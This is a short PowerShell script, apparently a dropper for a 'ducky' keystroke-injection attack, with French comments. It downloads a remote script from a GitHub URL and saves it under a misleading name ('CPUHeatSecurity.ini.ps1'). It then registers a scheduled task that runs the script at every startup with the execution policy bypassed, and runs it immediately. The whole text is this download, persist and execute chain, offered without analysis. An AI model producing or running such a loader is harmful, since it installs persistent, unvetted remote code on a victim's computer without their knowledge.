# Paramètres
$githubUrl = "https://raw.githubusercontent.com/Gamoboy/ducky/master/CPUHeatSecurity.ps1"
$destinationPath = "$env:USERPROFILE\CPUHeatSecurity.ini.ps1"
$taskName = "CPUHeatSecurity"

# Téléchargement du script depuis GitHub
Invoke-WebRequest -Uri $githubUrl -OutFile $destinationPath

# Création de la tâche planifiée
$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -File '$destinationPath'"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings

Invoke-Expression -Command $destinationPath